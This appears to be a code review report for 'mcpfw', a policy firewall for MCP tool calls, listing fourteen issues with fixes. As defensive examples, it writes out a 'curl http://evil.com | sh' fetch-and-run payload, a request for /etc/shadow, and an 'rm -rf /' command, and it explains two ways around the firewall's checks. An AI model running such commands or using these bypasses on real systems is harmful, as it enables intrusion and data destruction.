# mcpfw Code Improvement Report

Generated: 2026-05-04

---

## Summary

14 issues across 5 modules. The core proxy loop, dataclass design, and policy evaluation flow are sound. The most serious issues are two security bypass paths, a log injection / disk exhaustion risk, and a race condition on async stdout writes. Test coverage is missing for the wrapper, logger, and CLI — exactly the modules where the most impactful bugs live.

**Priority breakdown:** 4 High · 7 Medium · 3 Low

---

## High Priority

### Issue 1: `_tool_matches` Glob Regex Is Not Anchored

**File:** `policy.py:185`

The hand-rolled `pattern.replace("*", ".*")` with `re.match` has subtly wrong glob semantics. A pattern like `*_dangerous` becomes `.*_dangerous` and can match unintended tool names due to missing end anchoring.

**Fix:** Replace with `fnmatch.fnmatch()`:

```python
import fnmatch

def _tool_matches(self, tool_name: str | None, tool_patterns: list[str]) -> bool:
    if tool_name is None:
        return False
    for pattern in tool_patterns:
        if fnmatch.fnmatch(tool_name, pattern):
            return True
    return False
```

---

### Issue 2: `allow_paths` Silently Bypasses When Argument Key Isn't `path`/`directory`

**File:** `policy.py:244`

If a tool passes its path as `filepath`, `file`, `src`, `destination`, etc., `path_arg` resolves to `""` (falsy), and the `allow_paths` constraint is **silently skipped**. A tool call with `{"filepath": "/etc/shadow"}` against a rule with `allow_paths: ["/tmp/"]` would be allowed through.

**Fix:** Check a broader set of known path keys and fail closed if none are found:

```python
_PATH_ARG_KEYS: tuple[str, ...] = (
    "path", "directory", "file", "filepath", "filename",
    "src", "source", "destination", "dest", "target",
)

if rule.allow_paths:
    path_arg = next(
        (arguments[k] for k in _PATH_ARG_KEYS if k in arguments and isinstance(arguments[k], str)),
        None,
    )
    if path_arg:
        if not self._is_path_allowed(path_arg, rule.allow_paths):
            return Verdict(action=Action.BLOCK, rule_name=rule.name, ...)
    else:
        # Fail closed — no recognized path argument found
        return Verdict(action=Action.BLOCK, rule_name=rule.name,
                       reason="No path argument found; blocked by allow_paths rule", ...)
```

---

### Issue 3: `_flatten_arguments` Does Not Recurse Into Nested Dicts/Lists

**File:** `policy.py:309`

`block_patterns` only searches top-level string values. A nested argument like `{"command": {"exec": "curl http://evil.com | sh"}}` bypasses all pattern checks entirely.

**Fix:** Recursively extract all strings:

```python
def _flatten_arguments(self, arguments: dict[str, Any]) -> str:
    def _extract_strings(obj: Any) -> list[str]:
        if isinstance(obj, str):
            return [obj]
        if isinstance(obj, dict):
            result = []
            for k, v in obj.items():
                result.append(str(k))
                result.extend(_extract_strings(v))
            return result
        if isinstance(obj, (list, tuple)):
            result = []
            for item in obj:
                result.extend(_extract_strings(item))
            return result
        return [str(obj)]

    return " ".join(_extract_strings(arguments))
```

---

### Issue 4: Tool Arguments Logged In Full — No Redaction or Size Limit

**File:** `logger.py:49`

`msg.tool_arguments` (from an untrusted MCP client) is written verbatim to the JSONL audit log. Keys like `api_key`, `token`, `password` are logged in plaintext, and a large `content` argument can fill the audit log disk.

**Fix:** Sanitize before logging:

```python
_MAX_ARG_VALUE_LEN = 256
_SECRET_KEYS = frozenset({"key", "secret", "token", "password", "api_key", "apikey", "credential"})

def _sanitize_arguments(self, arguments: dict[str, Any]) -> dict[str, Any]:
    result = {}
    for k, v in arguments.items():
        if any(s in k.lower() for s in _SECRET_KEYS):
            result[k] = "<redacted>"
        elif isinstance(v, str) and len(v) > _MAX_ARG_VALUE_LEN:
            result[k] = v[:_MAX_ARG_VALUE_LEN] + f"…[{len(v) - _MAX_ARG_VALUE_LEN} chars truncated]"
        else:
            result[k] = v
    return result

# In log_tool_call:
"arguments": self._sanitize_arguments(msg.tool_arguments),
```

---

## Medium Priority

### Issue 5: Blocking `sys.stdout.buffer.write()` Inside Async Coroutines

**File:** `wrapper.py:143, 189`

Synchronous `sys.stdout.buffer.write()` / `flush()` calls inside async coroutines block the entire event loop. Under backpressure, this stalls all proxy tasks. Two concurrent coroutines writing to stdout also risk interleaved output.

**Fix:** Add an `asyncio.Lock` to serialize stdout writes:

```python
# In __init__:
self._stdout_lock = asyncio.Lock()

# In both coroutines, replace bare writes with:
async with self._stdout_lock:
    sys.stdout.buffer.write(data)
    sys.stdout.buffer.flush()
```

---

### Issue 6: `make_block_response` Called With `None` `msg_id` for Notifications

**File:** `wrapper.py:139, 176`

`msg.msg_id` is `None` for JSON-RPC notifications. Calling `make_block_response(None, ...)` produces `{"id": null, ...}` — invalid per JSON-RPC 2.0. Notifications must not receive a response; they should be dropped silently.

**Fix:**

```python
if verdict.is_blocked:
    if msg.msg_id is None:
        self.logger.log_event("blocked_notification",
                              message=f"Blocked notification '{msg.method}' (no response sent)",
                              server=self.server_name)
        continue
    block_resp = make_block_response(msg.msg_id, verdict.reason or "Blocked by mcpfw policy")
    ...
```

---

### Issue 7: `_pending_requests` Dict Grows Unboundedly

**File:** `wrapper.py:47`

If a server never responds (timeout, crash), the entry stays in `_pending_requests` forever. Long-running sessions with many tool calls leak memory monotonically.

**Fix:** Cap at a max size with LRU eviction:

```python
_MAX_PENDING = 1000

if msg.msg_id is not None:
    if len(self._pending_requests) >= _MAX_PENDING:
        oldest_id = next(iter(self._pending_requests))
        del self._pending_requests[oldest_id]
        self.logger.log_event("warning", message=f"Pending request cache full; evicted ID {oldest_id}")
    self._pending_requests[msg.msg_id] = msg
```

---

### Issue 8: `ValueError` from Enum Parsing Gives Cryptic Traceback

**File:** `policy.py:332`, `cli.py:123`

`Action("blokk")` raises `ValueError: 'blokk' is not a valid Action` with no friendly message. `_cmd_wrap` does not catch this, so a typo in a policy file dumps a Python traceback.

**Fix:** Add helper parsers and catch in `_cmd_wrap`:

```python
def _parse_action(value: str, context: str) -> Action:
    try:
        return Action(value)
    except ValueError:
        valid = [a.value for a in Action]
        raise ValueError(f"Invalid action '{value}' in {context}. Valid values: {valid}") from None

# In _cmd_wrap:
try:
    policy = load_policy(args.policy)
except (ValueError, yaml.YAMLError) as e:
    print(f"[mcpfw] Error: failed to load policy: {e}", file=sys.stderr)
    sys.exit(1)
```

---

### Issue 9: `log_response_scan` Uses String Literal Instead of Enum

**File:** `logger.py:73`

```python
if verdict.action.value == "allow" and verdict.rule_name is None:
```

Comparing against the string `"allow"` instead of `Action.ALLOW` breaks if the enum's value is ever changed.

**Fix:**

```python
from .policy import Action, Verdict

if verdict.action == Action.ALLOW and verdict.rule_name is None:
```

---

### Issue 10: `asyncio.get_event_loop()` Deprecated in Python 3.10+

**File:** `wrapper.py:112`

`asyncio.get_event_loop()` emits a `DeprecationWarning` in 3.10+ when called inside a running coroutine.

**Fix:** Use `asyncio.get_running_loop()` and store the transport:

```python
loop = asyncio.get_running_loop()
reader = asyncio.StreamReader()
protocol = asyncio.StreamReaderProtocol(reader)
self._stdin_transport = await loop.connect_read_pipe(lambda: protocol, sys.stdin.buffer)
```

---

### Issue 11: Exception Handler Swallows Full Traceback

**File:** `wrapper.py:98`

```python
except Exception as e:
    self.logger.log_event("error", message=str(e))
```

Only `str(e)` is logged — no file name, no line number. Post-incident debugging is nearly impossible.

**Fix:**

```python
import traceback

except Exception as e:
    self.logger.log_event("error", message=str(e), traceback=traceback.format_exc())
    print(f"[mcpfw] Unexpected error: {e}", file=sys.stderr)
```

---

### Issue 12: Zero Test Coverage for `wrapper.py`, `logger.py`, `cli.py`

The test suite covers `parser.py` and `policy.py` well but has no tests for the proxy loop, audit logger output, or CLI subcommands — the modules where the most impactful bugs live.

**Key tests to add:**

```python
# Test: block response with None id (documents spec violation)
def test_block_response_with_none_id():
    resp = json.loads(make_block_response(None, "blocked"))
    assert resp["id"] is None

# Test: audit logger writes correct JSONL
def test_audit_logger_jsonl(tmp_path):
    log_file = tmp_path / "audit.jsonl"
    logger = AuditLogger(log_path=log_file, stderr_summary=False)
    msg = _make_tool_call("read_file", {"path": "/tmp/test.txt"})
    verdict = Verdict(action=Action.ALLOW)
    logger.log_tool_call("test-server", msg, verdict)
    logger.close()
    entry = json.loads(log_file.read_text().splitlines()[0])
    assert entry["event"] == "tool_call"
    assert entry["tool"] == "read_file"
    assert entry["verdict"] == "allow"

# Test: nested args bypass block_patterns (documents Issue 3 until fixed)
def test_block_patterns_misses_nested_args():
    policy = Policy(server_policies=[ServerPolicy(server="s", tool_rules=[
        ToolRule(name="r", tools=["*"], block_patterns=[r"rm -rf"])
    ])])
    msg = _make_tool_call("exec", {"command": {"shell": "bash", "args": ["rm -rf /"]}})
    verdict = policy.evaluate_tool_call("s", msg)
    assert verdict.action == Action.ALLOW  # BUG: should be BLOCK once Issue 3 is fixed
```

---

## Low Priority

### Issue 13: Fallback `MessageType.RESPONSE` in Parser Is Undocumented

**File:** `parser.py:88`

The fallback for an unrecognized message shape silently classifies it as `RESPONSE`. This is a reasonable forward-compat choice but looks like an accident without a comment.

**Fix:** Add a clarifying comment, or introduce a `MessageType.UNKNOWN` variant checked at call sites.

---

### Issue 14: `DEFAULT_POLICY` Uses 4-Level Backslash Escaping — Hard to Read and Verify

**File:** `cli.py:204`

`"\\\\b\\\\d{3}-\\\\d{2}-\\\\d{4}\\\\b"` produces `\\b\\d{3}-\\d{2}-\\d{4}\\b` in the YAML file. This is correct but nearly unreadable.

**Fix:** Use a Python raw string with YAML single-quoted scalars:

```python
DEFAULT_POLICY = textwrap.dedent(r"""
    response_rules:
      - name: detect-ssn
        detect_patterns:
          - '\b\d{3}-\d{2}-\d{4}\b'
""")
```

Single-quoted YAML scalars treat backslashes literally, so `'\b\d{3}'` is exactly the regex `\b\d{3}` — no escaping needed.

---

## Recommended Fix Order

| # | Issue | File | Impact |
|---|-------|------|--------|
| 1 | `allow_paths` silently skips unknown path arg keys | `policy.py:244` | Security bypass |
| 2 | `_flatten_arguments` misses nested dicts/lists | `policy.py:309` | DLP bypass |
| 3 | Tool arguments logged without redaction/size limit | `logger.py:49` | Credential leak / DoS |
| 4 | Glob matching uses unanchored regex | `policy.py:185` | Wrong allow/block semantics |
| 5 | Blocking stdout writes in async coroutines | `wrapper.py:143,189` | Event loop stall |
| 6 | `None` msg_id sent as block response | `wrapper.py:139,176` | Invalid JSON-RPC |
| 7 | `_pending_requests` unbounded growth | `wrapper.py:47` | Memory leak |
| 8 | Enum parse errors give cryptic tracebacks | `policy.py:332` | Poor UX |
| 9 | `Action.ALLOW` compared as string literal | `logger.py:73` | Fragile check |
| 10 | `get_event_loop()` deprecated in 3.10+ | `wrapper.py:112` | Deprecation warning |
| 11 | Exception handler drops traceback | `wrapper.py:98` | Debugging blind spot |
| 12 | No tests for wrapper, logger, CLI | `tests/` | Unverified security paths |
| 13 | Undocumented fallback message type | `parser.py:88` | Readability |
| 14 | 4-level backslash escaping in default policy | `cli.py:204` | Maintainability |
